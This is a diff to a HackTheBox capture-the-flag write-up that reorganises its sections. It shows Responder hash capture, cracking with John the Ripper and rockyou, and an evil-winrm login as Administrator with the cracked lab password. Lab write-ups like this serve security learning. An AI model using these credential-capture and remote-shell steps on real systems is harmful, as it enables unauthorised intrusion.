@@ -4,6 +4,8 @@
 * [Tunneling](#tunelling)
 * [Scanning](#scanning)
 * [Website check](#website-check)
+* [Hash Cracking](#hash-cracking)
+* [Reverse Shell](#reverse-shell)
 
 ## General-Info
 Capturing flag in a machine using Kali Linux and its tools. Vulnerable machine I.P. provided by HackTheBox.
@@ -45,8 +47,9 @@ responder -I tun0
 ```
 ![image](https://user-images.githubusercontent.com/86112651/176478256-59b2ac2c-47c9-40c3-998b-51cea6ec3a77.png)
 ![image](https://user-images.githubusercontent.com/86112651/176478398-f6f0adad-22e4-45bb-ad5c-692ff8c136e2.png)
-## Cracking hash using John the ripper
-Our hash is :
+## Hash Cracking 
+Cracking hash using John the ripper
+Our hash from Responder is :
 ![image](https://user-images.githubusercontent.com/86112651/176478704-071e5bf1-00e2-4ade-ae5e-0b31a70f5440.png)
 Saving hash in a file :
 ```
@@ -62,18 +65,19 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 ![image](https://user-images.githubusercontent.com/86112651/176481030-bd590786-5633-4782-bbbf-1159f1d6f99a.png)
 Hash cracked
-## Using Admin password to spawn a reverse shell
+## Reverse Shell
+Using evil-winrm and the hash cracked password to spawn a reverse shell 
 ```
 5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-Downloading evil-winrm to spawn remote shell :
+Downloading evil-winrm :
 ```
 apt-get install evil-winrm
 ```
-Starting evil-winrm to spawn remote shell :
+Starting evil-winrm :
 ```
 evil-winrm -i 10.129.38.135 -u Administrator -p badminton 
 ```
